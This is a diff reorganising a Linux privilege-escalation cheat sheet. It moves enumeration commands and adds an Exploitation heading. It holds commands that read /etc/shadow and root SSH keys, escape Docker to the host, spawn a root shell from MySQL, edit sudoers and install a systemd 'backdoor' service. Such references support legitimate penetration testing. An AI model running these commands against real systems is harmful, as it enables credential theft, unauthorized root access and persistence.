@@ -37,7 +37,6 @@ https://github.com/pentestmonkey/unix-privesc-check
 unix-privesc-check standard > output.txt
 ```
 
-
 # Manual Enumeration
 ## Show current user
 ```bash
@@ -65,7 +64,7 @@ lsb_release -a
 
 ## List running processes
 ```bash
-ps aux
+ps aux # | grep root
 ```
 
 ## pspy (Source)
@@ -119,7 +118,6 @@ cat /etc/crontab
 ## List user cron jobs
 ```bash
 crontab -l
-sudo crontab -l
 ```
 
 ## List all users cron jobs
@@ -138,6 +136,22 @@ apt list --installed
 rpm -qa
 yum list installed
 ```
+
+## Find SUID files
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+## Find SGID files
+```bash
+find / -perm -g=s -type f 2>/dev/null
+```
+
+## Find files with capabilities
+```bash
+getcap -r / 2>/dev/null
+```
+
 
 # Credential Hunting
 
@@ -174,21 +188,6 @@ find . -type d ! -empty
 ## Find writable directories
 ```bash
 find / -writable -type d 2>/dev/null
-```
-
-## Find SUID files
-```bash
-find / -perm -u=s -type f 2>/dev/null
-```
-
-## Find SGID files
-```bash
-find / -perm -g=s -type f 2>/dev/null
-```
-
-## Find files with capabilities
-```bash
-getcap -r / 2>/dev/null
 ```
 
 ## Show fstab
@@ -268,6 +267,22 @@ cat ~/.vim_history
 find /home -name ".*history" 2>/dev/null
 ```
 
+## Check sensitive files
+```bash
+cat /etc/shadow 2>/dev/null
+cat /etc/sudoers 2>/dev/null
+cat /root/.ssh/id_rsa 2>/dev/null
+```
+
+## Check application configs
+```bash
+cat /var/www/html/config.php 2>/dev/null
+ls -la /etc/apache2/sites-enabled/
+ls -la /etc/nginx/sites-enabled/
+find /opt -name "*.conf" 2>/dev/null
+```
+
+# Exploitation
 ## Docker escape to host
 ```bash
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
@@ -278,12 +293,6 @@ docker run --rm -v /etc:/mnt/etc -it alpine vi /mnt/etc/passwd
 ```bash
 mysql -u root -p
 \! /bin/bash
-```
-
-## MySQL UDF exploits
-```bash
-searchsploit mysql udf
-searchsploit -m 1518
 ```
 
 ## Add user to sudoers
@@ -307,21 +316,6 @@ WantedBy=multi-user.target
 EOF
 systemctl enable backdoor.service
 systemctl start backdoor.service
-```
-
-## Check sensitive files
-```bash
-cat /etc/shadow 2>/dev/null
-cat /etc/sudoers 2>/dev/null
-cat /root/.ssh/id_rsa 2>/dev/null
-```
-
-## Check application configs
-```bash
-cat /var/www/html/config.php 2>/dev/null
-ls -la /etc/apache2/sites-enabled/
-ls -la /etc/nginx/sites-enabled/
-find /opt -name "*.conf" 2>/dev/null
 ```
 
 ---
